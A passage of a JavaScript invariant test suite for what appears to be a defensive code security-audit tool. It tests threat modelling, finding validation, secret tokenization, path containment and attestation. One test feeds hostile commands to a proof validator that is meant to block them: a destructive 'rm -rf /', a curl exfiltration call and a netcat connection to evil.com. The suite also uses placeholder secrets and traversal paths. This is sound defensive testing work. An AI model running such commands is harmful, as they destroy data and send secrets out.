        const sim = computeJaccardSimilarity(set1, set2); // 2 / 4 = 0.5
        if (sim !== 0.5) {
          throw new Error(`computeJaccardSimilarity failed: expected 0.5, got ${sim}`);
        }
        if (computeJaccardSimilarity(['X'], ['Y']) !== 0.0) {
          throw new Error('computeJaccardSimilarity failed for disjoint sets');
        }
        if (computeJaccardSimilarity(['X'], ['X']) !== 1.0) {
          throw new Error('computeJaccardSimilarity failed for identical sets');
        }

        // 2. evaluateDiscovery calculations
        const mockTruth = [
          { id: 'GT-01', cwe: 'CWE-89', file: 'src/db.js', targetLine: 10, expectedVerdict: 'VULNERABLE' },
          { id: 'GT-02', cwe: 'CWE-79', file: 'src/view.js', targetLine: 20, expectedVerdict: 'SAFE' }
        ];
        const mockCandidates = [
          { ruleId: 'CWE-89', location: { uri: 'src/db.js', startLine: 10 } },
          { ruleId: 'CWE-79', location: { uri: 'src/view.js', startLine: 20 } } // Spurious FP on safe site
        ];
        const discRes = evaluateDiscovery(mockCandidates, mockTruth);
        if (discRes.candidateTP !== 1 || discRes.candidateFP !== 1 || discRes.candidateFN !== 0) {
          throw new Error(`evaluateDiscovery metrics incorrect: TP=${discRes.candidateTP}, FP=${discRes.candidateFP}, FN=${discRes.candidateFN}`);
        }
        if (discRes.precision !== 0.5 || discRes.recall !== 1.0) {
          throw new Error(`evaluateDiscovery precision/recall incorrect: P=${discRes.precision}, R=${discRes.recall}`);
        }

        // 2b. evaluateDiscovery rejects empty URI and prevents duplicate TP inflation (Findings 1 & 2)
        const advCandidates = [
          {},
          { ruleId: 'CWE-89', location: { uri: '' } },
          { ruleId: 'CWE-89', location: { uri: 'src/db.js', startLine: 10 } },
          { ruleId: 'CWE-89', location: { uri: 'src/db.js', startLine: 10 } }
        ];
        const advRes = evaluateDiscovery(advCandidates, mockTruth);
        if (advRes.candidateTP !== 1 || advRes.duplicateCandidateCount !== 1) {
          throw new Error('evaluateDiscovery failed to reject empty URI or duplicate TP inflation');
        }

        // 3. evaluateStability calculations across simulated runs
        const simRuns = [
          [{ ruleId: 'CWE-89', location: { uri: 'src/db.js', startLine: 10 }, symbol: 'q' }],
          [{ ruleId: 'CWE-89', location: { uri: 'src/db.js', startLine: 15 }, symbol: 'q' }] // shifted line
        ];
        const stabRes = evaluateStability(simRuns, repoRoot);
        if (stabRes.meanJaccardSimilarity !== 1.0 || stabRes.totalUniqueLineages !== 1) {
          throw new Error(`evaluateStability failed line-shift invariant: J=${stabRes.meanJaccardSimilarity}, unique=${stabRes.totalUniqueLineages}`);
        }
      }
    },
    {
      id: 'SEC-INV-20',
      name: 'Multi-Profile Threat Modeling & Granular Coverage Classification Invariant',
      check: () => {
        // 1. detectRepositoryInventory extracts facts
        const inv = detectRepositoryInventory(repoRoot);
        if (!inv.profiles.includes('agent-plugin') || !inv.languages.includes('JavaScript')) {
          throw new Error('detectRepositoryInventory failed to discover agent-plugin or JavaScript');
        }

        // 2. buildThreatModel produces evidence-bound components and grounds assumptions
        const tm = buildThreatModel(repoRoot);
        if (!tm.targetProfile || tm.targetProfile.primary !== 'agent-plugin') {
          throw new Error(`buildThreatModel failed targetProfile validation: got ${tm.targetProfile?.primary}`);
        }
        const pluginComp = tm.components.find(c => c.name === 'PluginSystem');
        if (!pluginComp || !pluginComp.evidence || !pluginComp.evidence.path) {
          throw new Error('buildThreatModel component lacks verified evidence pointer');
        }
        const authActor = tm.actors.find(a => a.id === 'authenticated-user');
        if (!authActor || authActor.status !== 'ASSUMPTION') {
          throw new Error('buildThreatModel failed to classify unevidenced actor as ASSUMPTION');
        }

        // 3. categorizeDirectory never blanket excludes test surfaces & recognizes build directories (R2-P0-10)
        const testDir = categorizeDirectory('test');
        if (testDir.status !== 'SCANNED_TEST_EXECUTABLE') {
          throw new Error(`categorizeDirectory blanket excluded test surface: got ${testDir.status}`);
        }
        const ciDir = categorizeDirectory('.github');
        if (ciDir.status !== 'SCANNED_CI') {
          throw new Error(`categorizeDirectory failed to classify .github as SCANNED_CI: got ${ciDir.status}`);
        }
        const cmakeDir = categorizeDirectory('cmake');
        if (cmakeDir.status !== 'SCANNED_BUILD') {
          throw new Error(`categorizeDirectory failed to classify cmake as SCANNED_BUILD: got ${cmakeDir.status}`);
        }

        // 4. classifyFile classifies individual files & prevents executable bypass in static/
        const cCi = classifyFile('.github/workflows/ci.yml');
        const cCtx = classifyFile('rules/AGENTS.md');
        const cTest = classifyFile('test/scanner.test.js');
        const cBuild = classifyFile('package.json');
        const cStaticMedia = classifyFile('static/images/logo.png');
        const cStaticScript = classifyFile('static/scripts/exploit.js');
        if (cCi.classification !== 'SCANNED_CI' ||
            cCtx.classification !== 'SCANNED_AGENT_CONTEXT' ||
            cTest.classification !== 'SCANNED_TEST_EXECUTABLE' ||
            cBuild.classification !== 'SCANNED_BUILD' ||
            cStaticMedia.classification !== 'EXCLUDED_STATIC_ASSET' ||
            cStaticScript.classification !== 'SCANNED_RUNTIME' ||
            cStaticScript.isScanned !== true) {
          throw new Error('classifyFile failed to accurately classify file attack surfaces or allowed executable bypass');
        }

        // 5. Synthetic Non-Node Repository Threat Model Validation
        const synDir = fs.mkdtempSync(path.join(os.tmpdir(), 'sec-inv-tm-'));
        try {
          fs.mkdirSync(path.join(synDir, 'handlers'), { recursive: true });
          fs.mkdirSync(path.join(synDir, 'auth'), { recursive: true });
          fs.writeFileSync(path.join(synDir, 'main.go'), 'package main', 'utf8');

          const synTm = buildThreatModel(synDir);
          const synApi = synTm.components.find(c => c.name === 'API');
          if (!synApi || synApi.evidence.path !== 'handlers/') {
            throw new Error('Synthetic Go repo API component had dangling or incorrect evidence path');
          }
          const synAuth = synTm.components.find(c => c.name === 'Auth');
          if (!synAuth || synAuth.evidence.path !== 'auth/' || synAuth.evidence.manifestOrigin === 'package.json:dependencies') {
            throw new Error('Synthetic Go repo Auth component fabricated package.json evidence');
          }
          const synOp = synTm.actors.find(a => a.id === 'system-operator');
          if (!synOp || synOp.status !== 'ASSUMPTION' || synOp.evidence !== null) {
            throw new Error('system-operator claimed FACT in repo without CI');
          }
        } finally {
          fs.rmSync(synDir, { recursive: true, force: true });
        }
      }
    },
    {
      id: 'SEC-INV-21',
      name: 'Finding Type & Safe Defensive Proof Policy Invariant',
      check: () => {
        // 1. validateFindingType separates vulnerabilities from hardening and informational
        const v = validateFindingType('VULNERABILITY');
        const h = validateFindingType('HARDENING');
        const i = validateFindingType('INFORMATIONAL');
        const d = validateFindingType('UNSPECIFIED', 'CWE-hardening', 'Stricter CSP config');
        const infoExposure = validateFindingType(null, 'CWE-200', 'Sensitive Information Disclosure in API');
        if (!v.valid || !h.valid || !i.valid || d.findingType !== 'HARDENING' || infoExposure.findingType !== 'VULNERABILITY') {
          throw new Error('validateFindingType failed to validate or infer finding types or misclassified information disclosure');
        }

        // 2. Hardening cannot masquerade as CRITICAL / HIGH vulnerability
        const testHardening = {
          id: 'SEC-TEST-H',
          ruleId: 'SEC-HARD',
          title: 'Hardening Title',
          findingType: 'HARDENING',
          severity: 'CRITICAL',
          location: { uri: 'skills/security-audit/scripts/safe-git.mjs', startLine: 1 }
        };
        const validatedH = validateCanonicalFindings([testHardening], repoRoot);
        if (validatedH[0].severity !== 'LOW') {
          throw new Error(`Hardening finding was not capped to LOW severity: got ${validatedH[0].severity}`);
        }

        // 3. validateSafeProof blocks prohibited proof patterns (destructive commands, live exploits, exfil, netcat)
        const safeProof = validateSafeProof('Source-to-sink dataflow trace', 'STATIC_TRACE');
        const badCmd = validateSafeProof('rm -rf / --no-preserve-root', 'UNIT_TEST');
        const badExfil = validateSafeProof('curl https://burpcollaborator.net/leak', 'STATIC_TRACE');
        const badNetcat = validateSafeProof('nc evil.com 4444', 'STATIC_TRACE');
        const badExploit = validateSafeProof('LIVE_EXPLOIT executed against production', 'STATIC_TRACE');
        if (!safeProof.valid || badCmd.valid || badExfil.valid || badNetcat.valid || badExploit.valid) {
          throw new Error('validateSafeProof failed to block prohibited unsafe proof pattern, destructive command, or netcat');
        }

        // 4. Prohibited proof in candidate (including attackPath) downgrades to DEFERRED fail-closed
        const badCandidate = {
          id: 'SEC-TEST-BAD-POC',
          ruleId: 'CWE-78',
          title: 'Command Injection',
          proof: 'benign trace',
          attackPath: { steps: [], proofOfConcept: 'rm -rf / --no-preserve-root' },
          location: { uri: 'skills/security-audit/scripts/safe-git.mjs', startLine: 1 },
          disposition: 'REPORTABLE',
          verdict: 'CONFIRMED',
          consensus: { supports: 3, totalVotes: 3 },
          rigor: { score: 0.9 }
        };
        const validatedBad = validateCanonicalFindings([badCandidate], repoRoot);
        if (validatedBad[0].disposition !== 'DEFERRED' || !validatedBad[0].dispositionReason.includes('PROHIBITED_PROOF_VIOLATION')) {
          throw new Error('Candidate with prohibited proof pattern was not downgraded to DEFERRED fail-closed');
        }
      }
    },
    {
      id: 'SEC-INV-22',
      name: 'Standards Mapping, Security Property First, & Failure Taxonomy Invariant',
      check: () => {
        // 1. Standards mapping maps CWE-89 to ASVS for web-api, but filters for CLI
        const webStd = resolveStandardsMapping('CWE-89', 'web-api');
        const cliStd = resolveStandardsMapping('CWE-89', 'cli');
        if (!webStd.cwe.includes('CWE-89') || webStd.asvs.length === 0 || cliStd.asvs.length !== 0) {
          throw new Error('resolveStandardsMapping failed profile-aware standards resolution');
        }

        // 2. Security property first inference
        const secProp = inferSecurityProperty('CWE-89', 'SQL Injection in Query');
        const cmdProp = inferSecurityProperty('CUSTOM-EXEC-RULE', 'arbitrary command execution in subshell');
        if (secProp !== 'INPUT_INTEGRITY_QUERY_CONFINEMENT' || cmdProp !== 'PROCESS_EXECUTION_INTEGRITY') {
          throw new Error(`inferSecurityProperty returned unexpected properties: secProp=${secProp}, cmdProp=${cmdProp}`);
        }

        // 3. Failure taxonomy reason codes
        const r1 = deriveReasonCode('REPORTABLE');
        const r2 = deriveReasonCode('DEFERRED', 'PROHIBITED_PROOF_VIOLATION detected');
        const r3 = deriveReasonCode('DEFERRED', 'Coverage is partial');
        const r4 = deriveReasonCode('DEFERRED', 'orchestration incomplete / skipped stage');
        const r5 = deriveReasonCode('DEFERRED', 'missing severity / unrated vector');
        if (r1 !== 'AFFIRMATIVELY_VERIFIED' || r2 !== 'PROHIBITED_PROOF' || r3 !== 'COVERAGE_PARTIAL' ||
            r4 !== 'ORCHESTRATION_INCOMPLETE' || r5 !== 'SEVERITY_UNRATED') {
          throw new Error('deriveReasonCode produced non-standard reason codes');
        }

        // 4. Validate all 9 schemas in schemas/ are valid JSON and define schemaVersion
        const schemaFiles = [
          'scan-manifest.schema.json',
          'threat-model.schema.json',
          'candidate.schema.json',
          'candidate-set.schema.json',
          'verifier-ballot.schema.json',
          'verifier-ballot-set.schema.json',
          'canonical-finding.schema.json',
          'execution-attestation.schema.json',
          'audit-baseline.schema.json'
        ];
        for (const file of schemaFiles) {
          const fullPath = path.resolve(repoRoot, 'schemas', file);
          if (!fs.existsSync(fullPath)) {
            throw new Error(`Schema file missing: schemas/${file}`);
          }
          const parsed = JSON.parse(fs.readFileSync(fullPath, 'utf8'));
          if (!parsed.$schema || !parsed.title || !parsed.properties?.schemaVersion) {
            throw new Error(`Schema schemas/${file} is missing required JSON Schema properties (including schemaVersion)`);
          }
        }
      }
    },
    {
      id: 'SEC-INV-23',
      name: 'Execution Attestation, Attack Path 2.0, & Dependency Boundary Invariant',
      check: () => {
        // 1. buildExecutionAttestation enforces stage completeness under default-deny
        const attFull = buildExecutionAttestation({
          repoRoot,
          executedStages: ['INVENTORY', 'THREAT_MODELING', 'DISCOVERY_MATRIX', 'VERIFICATION_PANEL', 'FINALIZATION'],
          coverageComplete: true,
          delegationObserved: true
        });
        const attDegraded = buildExecutionAttestation({
          repoRoot,
          executedStages: ['INVENTORY', 'FINALIZATION'],
          coverageComplete: true,
          delegationObserved: true
        });
        if (!attFull.verdict.startsWith('COMPLETE') || attDegraded.verdict !== 'DEGRADED') {
          throw new Error('buildExecutionAttestation failed stage completeness verdict derivation');
        }

        // 2. validateAttackPath enforces Schema 2.0 attributes and computes evidenceHash
        const apTest = {
          attackPathId: 'AP-INV-23',
          attackerCapability: 'NETWORK_UNAUTHENTICATED',
          entrypoint: { uri: 'skills/security-audit/scripts/safe-git.mjs', line: 1, symbol: 'main' },
          source: { uri: 'skills/security-audit/scripts/safe-git.mjs', line: 1, description: 'Source user input' },
          transformations: [{ uri: 'skills/security-audit/scripts/safe-git.mjs', line: 5, description: 'Step' }],
          authorizationBoundary: { uri: 'skills/security-audit/scripts/safe-git.mjs', line: 10, description: 'Auth boundary' },
          defenseChecks: [],
          sink: { uri: 'skills/security-audit/scripts/safe-git.mjs', line: 15, symbol: 'execSync', description: 'Sink' },
          impactBoundary: { target: 'host', blastRadius: 'local' },
          preconditions: ['Precond'],
          postconditions: ['Postcond']
        };
        const valAp = validateAttackPath(apTest, repoRoot);
        if (!valAp.valid || valAp.schemaVersion !== '2.0' || !valAp.source.evidenceHash) {
          throw new Error(`validateAttackPath failed Schema 2.0 validation: ${valAp.error}`);
        }

        // 2b. Negative tests: Tampered evidenceHash and invalid attackerCapability must be rejected
        const badHashAp = { ...apTest, source: { ...apTest.source, evidenceHash: 'deadbeef00000000000000000000000000000000000000000000000000000000' } };
        const valBadHash = validateAttackPath(badHashAp, repoRoot);
        if (valBadHash.valid) {
          throw new Error('validateAttackPath allowed tampered evidenceHash without rejection');
        }

        const badCapAp = { ...apTest, attackerCapability: 'INVALID_CAPABILITY_OVERRIDE' };
        const valBadCap = validateAttackPath(badCapAp, repoRoot);
        if (valBadCap.valid) {
          throw new Error('validateAttackPath allowed invalid attackerCapability without rejection');
        }

        // 3. detectDependencyBoundary detects package manifests or lockfiles
        const dep = detectDependencyBoundary(repoRoot);
        if (!dep.hasDependencyEvidence || dep.count === 0) {
          throw new Error('detectDependencyBoundary failed to detect repository package manifest or lockfile');
        }

        // 4. finalizeScan integration: missing votes marks VERIFICATION_PANEL skipped and results in DEGRADED
        const mockCand = {
          id: 'INV-23-CAND',
          ruleId: 'CWE-89',
          title: 'SQL Injection',
          location: { uri: 'skills/security-audit/scripts/safe-git.mjs', startLine: 1 }
        };
        const finalizedNoVotes = finalizeScan({
          candidates: [mockCand],
          manifest: { files: [{ path: 'test.js', isScanned: true }] },
          votes: [],
          repoRoot
        });
        if (finalizedNoVotes.summary.execution.verdict === 'COMPLETE' ||
            !finalizedNoVotes.summary.execution.skippedStages.includes('VERIFICATION_PANEL')) {
          throw new Error('finalizeScan failed to reflect skipped verification stage in execution attestation');
        }
      }
    },
    {
      id: 'SEC-INV-24',
      name: 'Audit Baseline, Defect Management, Model Provenance, & Stability Benchmarks Invariant',
      check: () => {
        // 1. buildAuditBaseline generates deterministic fingerprints
        const testCand = {
          id: 'INV-24-CAND',
          lineageId: 'LIN-INV-24',
          ruleId: 'CWE-89',
          title: 'SQL Injection',
          disposition: 'REPORTABLE',
          location: { uri: 'skills/security-audit/scripts/safe-git.mjs', startLine: 1 }
        };
        const baseline = buildAuditBaseline({
          repoRoot,
          targetRevision: 'HEAD',
          canonicalFindings: [testCand],
          manifest: { files: [{ path: 'skills/security-audit/scripts/safe-git.mjs', isScanned: true }] },
          threatModel: { components: [{ name: 'Git' }], trustBoundaries: [] }
        });
        if (!baseline.scopeFingerprint || !baseline.threatModelFingerprint || !baseline.findingLineageIds.includes('LIN-INV-24')) {
          throw new Error('buildAuditBaseline failed to generate valid baseline fingerprints');
        }

        // 2. inferDefectManagement generates structured rootCause and preventiveAction
        const dmSql = inferDefectManagement('CWE-89', 'SQL Injection in Query');
        const dmExec = inferDefectManagement('CWE-78', 'Command Injection via spawn');
        if (dmSql.rootCause !== 'UNCONFINED_DYNAMIC_QUERY_CONSTRUCTION' || dmExec.rootCause !== 'UNSAFE_PROCESS_EXECUTION') {
          throw new Error(`inferDefectManagement returned unexpected root causes: ${dmSql.rootCause}, ${dmExec.rootCause}`);
        }

        // 3. finalizeScan integration: attaches defectManagement, modelProvenance, and baseline
        const finalized = finalizeScan({
          candidates: [testCand],
          repoRoot
        });
        if (!finalized.baseline || !finalized.modelProvenance || finalized.modelProvenance.systemPromptIntegrity !== 'UNKNOWN') {
          throw new Error('finalizeScan failed to attach baseline and model provenance');
        }
        if (finalized.canonicalFindings[0].defectManagement.rootCause !== 'UNCONFINED_DYNAMIC_QUERY_CONSTRUCTION') {
          throw new Error('finalizeScan failed to attach defectManagement to canonical finding');
        }

        // 4. evaluateCorpusStability evaluates safe corpus, vuln corpus, and remediated pairs
        const corpus = evaluateCorpusStability(repoRoot);
        if (corpus.corpusA.validatedVulnerabilities !== 0 || corpus.metrics.postFixRediscoveryRate !== 0.0) {
          throw new Error('evaluateCorpusStability detected false positives or regression in safe/remediated corpora');
        }
      }
    },
    {
      id: 'SEC-INV-25',
      name: 'Bounded Assurance, Measurement Integrity, & Legacy Exclusion Migration',
      check: () => {
        // 1. Purpose Boundary & Defensive Terminology in SKILL.md
        const skillPath = path.resolve(repoRoot, 'skills/security-audit/SKILL.md');
        const skillText = fs.readFileSync(skillPath, 'utf8');
        if (!skillText.includes('## Purpose Boundary') || skillText.includes('--strictness')) {
          throw new Error('SKILL.md missing Purpose Boundary or retains --strictness in public command syntax');
        }
        if (skillText.includes('Exploit Hacker') || skillText.includes('Vulnerability Hunting')) {
          throw new Error('SKILL.md contains offensive persona or workflow terminology');
        }

        // 2. Discovery eval harness defaults to SIMULATED_CI mode
        const disc = runDiscoveryEval(repoRoot);
        if (disc.evaluationMode !== 'SIMULATED_CI' || disc.modelDependent !== false) {
          throw new Error('runDiscoveryEval default mode is not declared as SIMULATED_CI');
        }

        // 3. Stability eval harness defaults to SYNTHETIC_HARNESS mode
        const stab = runStabilityEval(repoRoot);
        if (stab.evaluationMode !== 'SYNTHETIC_HARNESS' || stab.status !== 'HARNESS_VERIFIED') {
          throw new Error('runStabilityEval default mode is not declared as SYNTHETIC_HARNESS');
        }

        // 4. Legacy exclusion migration normalization
        if (normalizeDirectoryStatus('EXCLUDED_GENERATED') !== 'EXCLUDED_GENERATED_VERIFIED' ||
            normalizeDirectoryStatus('EXCLUDED_NON_CODE') !== 'EXCLUDED_STATIC_ASSET' ||
            normalizeDirectoryStatus('EXCLUDED_TEST') !== 'SCANNED_TEST_EXECUTABLE') {
          throw new Error('normalizeDirectoryStatus failed to map legacy exclusion statuses');
        }
      }
    },
    {
      id: 'SEC-INV-26',
      name: 'Pre-Context Secret Protection, Capabilities Attestation, Equivalence Key, Accepted Risk Waivers, TCB Isolation, & Canaries',
      check: () => {
        // 1. Pre-Context Secret Protection & Line Count Preservation
        const sampleToken = ['ghp_', '123456789012345678901234567890123456'].join('');
        const samplePem = ['-----BEGIN PRIVATE KEY-----', 'abc', '-----END PRIVATE KEY-----'].join('\n');
        const sampleSource = `const token = "${sampleToken}";\nconst pem = "${samplePem.replace(/\n/g, '\\n')}";\nconst normal = "hello";`;
        const tokRes = tokenizeSecretsForContext(sampleSource);
        if (tokRes.secretCount !== 2) {
          throw new Error(`tokenizeSecretsForContext found ${tokRes.secretCount} secrets (expected 2)`);
        }
        if (sampleSource.split('\n').length !== tokRes.tokenizedText.split('\n').length) {
          throw new Error('tokenizeSecretsForContext altered line count of source file');
        }
        const detok = detokenizeSecrets(tokRes.tokenizedText, tokRes.secretsMap);
        if (!detok.includes(sampleToken)) {
          throw new Error('detokenizeSecrets failed to restore original secret');
        }

        // 2. Capabilities Attestation in buildExecutionAttestation
        const attConformant = buildExecutionAttestation({
          delegationObserved: true,
          capabilities: {
            required: ['repository.read'],
            observed: ['repository.read'],
            forbidden: ['filesystem.write'],
            status: 'CONFORMANT'
          }
        });
        if (attConformant.capabilities.status !== 'CONFORMANT' || !attConformant.verdict.startsWith('COMPLETE')) {
          throw new Error('buildExecutionAttestation failed to assert conformant capabilities');
        }

        // 3. Execution Equivalence Key in buildAuditBaseline
        const bl = buildAuditBaseline({ targetRevision: 'HEAD', canonicalFindings: [] });
        if (!bl.executionEquivalenceKey || bl.executionEquivalence !== 'PARTIAL') {
          throw new Error('buildAuditBaseline failed to include executionEquivalenceKey');
        }

        // 4. Accepted Risk / Waiver validation
        const valWaiver = validateRiskAcceptance({
          findingLineageId: 'LIN-TEST-123',
          reason: 'Compensating control active',
          acceptedBy: 'ciso@corp.internal',
          expiresAt: new Date(Date.now() + 86400000).toISOString(),
          compensatingControls: 'Network boundary enforced'
        }, 'LIN-TEST-123');
        if (!valWaiver.valid) {
          throw new Error(`validateRiskAcceptance rejected valid waiver: ${valWaiver.reason}`);
        }

        // 5. Tool Self-Integrity / TCB Isolation
        const tcbFail = verifyToolSelfIntegrity(process.cwd(), process.cwd());
        if (tcbFail.valid || tcbFail.status !== 'TCB_ISOLATION_ERROR') {
          throw new Error('verifyToolSelfIntegrity failed to enforce TCB isolation on identical roots');
        }

        // 6. Calibration Canaries
        const canRes = runCalibrationCanaries(repoRoot);
        if (!canRes.pass || canRes.status !== 'CALIBRATED') {
          throw new Error(`runCalibrationCanaries failed: ${canRes.error}`);
        }
      }
    },
    {
      id: 'SEC-INV-27',
      name: 'Pre-Context Review Preparation, Fail-Unknown Attestation, Real TCB Verification, & Disposition Canaries (R5)',
      check: () => {
        // 1. Pre-Context Secret Protection via prepareReviewContext
        const prep = prepareReviewContext(repoRoot);
        if (!prep.success || !prep.manifest) {
          throw new Error('prepareReviewContext failed to return valid manifest');
        }
        const prepAws = readPreparedFile(repoRoot, 'evals/secret-leak/sl-01-aws-key.js');
        if (!prepAws || !prepAws.includes('<SECRET:class=AWS_ACCESS_KEY:hash=') || prepAws.includes('AKIAIOSFODNN7EXAMPLE')) {
          throw new Error('Prepared review context contains raw plaintext secret');
        }

        // 2. Capability Attestation Fail-Unknown
        const emptyAtt = buildExecutionAttestation();
        if (emptyAtt.capabilities.status !== 'UNKNOWN' || emptyAtt.capabilities.observed.length !== 0 || emptyAtt.delegationObserved !== false) {
          throw new Error('buildExecutionAttestation failed to fail-unknown on empty telemetry');
        }
        const declaredAtt = buildExecutionAttestation({ delegationObserved: true, capabilities: { declaration: true } });
        if (declaredAtt.capabilities.status !== 'DECLARED' || declaredAtt.verdict !== 'COMPLETE_DECLARED') {
          throw new Error('Declared capabilities failed to produce COMPLETE_DECLARED verdict');
        }
        const verifiedAtt = buildExecutionAttestation({
          delegationObserved: true,
          capabilities: { required: ['repository.read'], observed: ['repository.read'], forbidden: ['filesystem.write'], status: 'CONFORMANT' }
        });
        if (verifiedAtt.capabilities.status !== 'CONFORMANT' || verifiedAtt.verdict !== 'COMPLETE_VERIFIED') {
          throw new Error('Observed conformant capabilities failed to produce COMPLETE_VERIFIED verdict');
        }

        // 3. Real TCB Verification & Overlap Detection
        const overlapRes = verifyToolSelfIntegrity(path.resolve(repoRoot, 'skills/security-audit'), repoRoot);
        if (overlapRes.valid || overlapRes.status !== 'TCB_OVERLAP') {
          throw new Error('verifyToolSelfIntegrity failed to detect TCB_OVERLAP on nested tool root');
        }
        const selfAuditRes = verifyToolSelfIntegrity(path.resolve(repoRoot, 'skills/security-audit'), repoRoot, { allowSelfAudit: true });
        if (!selfAuditRes.valid || selfAuditRes.status !== 'SELF_AUDIT_MODE' || selfAuditRes.verifiedScriptsCount < 8) {
          throw new Error('verifyToolSelfIntegrity failed self-audit mode verification');
        }

        // 4. Disposition Canaries & Model Provenance
        const canaryDisp = runDispositionCanaries(repoRoot);
        if (!canaryDisp.pass || canaryDisp.status !== 'FINALIZER_CALIBRATED') {
          throw new Error('runDispositionCanaries failed to return FINALIZER_CALIBRATED');
        }
      }
    },
    {
      id: 'SEC-INV-28',
      name: 'Six-Pillar Assurance Gates, Fail-Closed TCB Manifest Completeness, Explicit Self-Audit, and Mandated Context Isolation (R6)',
      check: () => {
        const fullManifest = buildDirectoryManifest(repoRoot);

        // 1. Coverage COMPLETE + execution INCOMPLETE => canDeclareClean: false (R6-P0-01)
        const scanIncomplete = finalizeScan({
          candidates: [],
          manifest: fullManifest,
          repoRoot,
          auditIntent: 'REGRESSION',
          allowSelfAudit: true,
          capabilities: {
            required: ['repository.read'],
            observed: ['filesystem.write'],
            forbidden: ['filesystem.write'],
            status: 'VIOLATION'
          }
        });
        if (scanIncomplete.summary.canDeclareClean !== false || scanIncomplete.summary.execution.verdict !== 'INCOMPLETE') {
          throw new Error('SEC-INV-28: Execution attestation INCOMPLETE did not fail closed on canDeclareClean');
        }

        // 2. Coverage COMPLETE + execution DEGRADED => canDeclareClean: false (R6-P0-01)
        const scanDegraded = finalizeScan({
          candidates: [],
          manifest: fullManifest,
          repoRoot,
          auditIntent: 'DISCOVERY',
          allowSelfAudit: true
        });
        if (scanDegraded.summary.canDeclareClean !== false || scanDegraded.summary.execution.verdict !== 'DEGRADED') {
          throw new Error('SEC-INV-28: Execution attestation DEGRADED did not fail closed on canDeclareClean');
        }

        // 3. Tool Integrity violation => canDeclareClean: false (R6-P0-01)
        const scanOverlap = finalizeScan({
          candidates: [],
          manifest: fullManifest,
          repoRoot,
          auditIntent: 'REGRESSION',
          allowSelfAudit: false
        });
        if (scanOverlap.summary.canDeclareClean !== false || scanOverlap.summary.toolIntegrity.status !== 'TCB_OVERLAP') {
          throw new Error('SEC-INV-28: Tool integrity TCB_OVERLAP did not fail closed on canDeclareClean');
        }

        // 4. Fail-closed TCB manifest completeness and digest verification (R6-P1-01)
        const tempFakeDir = fs.mkdtempSync(path.join(os.tmpdir(), 'sec-audit-inv28-'));
        try {
          const fakePath = path.join(tempFakeDir, 'tool-integrity-manifest.json');
          fs.writeFileSync(fakePath, JSON.stringify({
            schemaVersion: '1.0.0',
            toolVersion: '1.0.0',
            manifestDigest: '0000',
            criticalScripts: {}
          }), 'utf8');
          const emptyRes = verifyToolSelfIntegrity(tempFakeDir, repoRoot, { allowSelfAudit: true });
          if (emptyRes.valid || emptyRes.status !== 'INTEGRITY_VIOLATION') {
            throw new Error('SEC-INV-28: Manifest with empty criticalScripts was accepted as conformant');
          }
        } finally {
          fs.rmSync(tempFakeDir, { recursive: true, force: true });
        }

        // 5. Explicit self-audit authorization only — no pathname guessing (R6-P1-02)
        const noSniff = finalizeScan({
          candidates: [],
          manifest: fullManifest,
          repoRoot,
          allowSelfAudit: false
        });
        if (noSniff.summary.toolIntegrity.status !== 'TCB_OVERLAP' || noSniff.summary.canDeclareClean) {
          throw new Error('SEC-INV-28: Pathname containing "security-audit" implicitly activated self-audit mode');
        }

        // 6. Mandated Context Isolation (R6-P1-03)
        const validClean = finalizeScan({
          candidates: [],
          manifest: fullManifest,
          repoRoot,
          auditIntent: 'REGRESSION',
          allowSelfAudit: true
        });
        if (!validClean.summary.canDeclareClean || validClean.summary.execution.contextIsolation.status !== 'MANDATED') {
          throw new Error('SEC-INV-28: Valid clean scan failed or contextIsolation was not MANDATED');
        }
      }
    },
    {
      id: 'SEC-INV-29',
      name: 'Strict Path Containment & Sibling Prefix Enclosure (R7-P0-01)',
      check: () => {
        // 1. isPathContained semantics
        const root = path.resolve(repoRoot, 'scratch/context');
        if (!isPathContained(root, path.resolve(root, 'sub/file.txt'))) {
          throw new Error('isPathContained rejected normal nested child path');
        }
        if (!isPathContained(root, root)) {
          throw new Error('isPathContained rejected exact root match');
        }
        if (isPathContained(root, path.resolve(root, '../outside.txt'))) {
          throw new Error('isPathContained accepted parent directory traversal');
        }
        if (isPathContained(root, path.resolve(repoRoot, 'scratch/context-evil/outside.txt'))) {
          throw new Error('isPathContained accepted sibling directory with matching string prefix (context-evil)');
        }
        if (isPathContained(root, path.resolve(repoRoot, 'scratch/context_other/file.txt'))) {
          throw new Error('isPathContained accepted sibling directory with matching string prefix (context_other)');
        }

        // 2. prepareReviewContext containment enforcement
        const prep = prepareReviewContext(repoRoot, {
          targetFiles: ['../outside.txt', '../context-evil/pwned.txt']
        });
        if (prep.manifest.scannedFilesCount !== 0 || prep.manifest.preparedFilesCount !== 0) {
          throw new Error('prepareReviewContext accepted traversal/sibling targetFiles');
        }

        // 3. getPreparedContextFilePath containment
        const evilCandidate = getPreparedContextFilePath(repoRoot, '../context-evil/file.txt');
        if (evilCandidate !== null) {
          throw new Error('getPreparedContextFilePath accepted sibling prefix path');
        }
      }
    },
    {
      id: 'SEC-INV-30',
      name: 'Cross-Platform SARIF URI Normalization & Granular Evidence Binding Accounting (R7-P0-02)',
      check: () => {
        // 1. Cross-platform URI resolution
        const winPath = 'skills\\security-audit\\scripts\\safe-git.mjs';
        const normWin = resolveExternalUri(repoRoot, winPath);
        if (normWin !== 'skills/security-audit/scripts/safe-git.mjs') {
          throw new Error(`resolveExternalUri failed to normalize Windows path: ${normWin}`);
        }
        const pctPath = 'skills%5Csecurity-audit%5Cscripts%5Csafe-git.mjs';
        const normPct = resolveExternalUri(repoRoot, pctPath);
        if (normPct !== 'skills/security-audit/scripts/safe-git.mjs') {
          throw new Error(`resolveExternalUri failed to normalize percent-encoded path: ${normPct}`);
        }

        // 2. ingestExternalEvidence granular accounting & deduplication
        const mockSarif = {
          version: '2.1.0',
          runs: [
            {
              tool: { driver: { name: 'MockScanner' } },
              results: [
                {
                  ruleId: 'MOCK-01',
                  message: { text: 'Real finding in source' },
                  locations: [{ physicalLocation: { artifactLocation: { uri: 'skills/security-audit/scripts/safe-git.mjs' }, region: { startLine: 1 } } }]
                },
                {
                  ruleId: 'MOCK-01',
                  message: { text: 'Shadow context duplicate finding' },
                  locations: [{ physicalLocation: { artifactLocation: { uri: 'scratch/context/skills/security-audit/scripts/safe-git.mjs' }, region: { startLine: 1 } } }]
                },
                {
                  ruleId: 'MOCK-02',
                  message: { text: 'Missing file finding' },
                  locations: [{ physicalLocation: { artifactLocation: { uri: 'src/missing-file.js' }, region: { startLine: 1 } } }]
                },
                {
                  ruleId: 'MOCK-03',
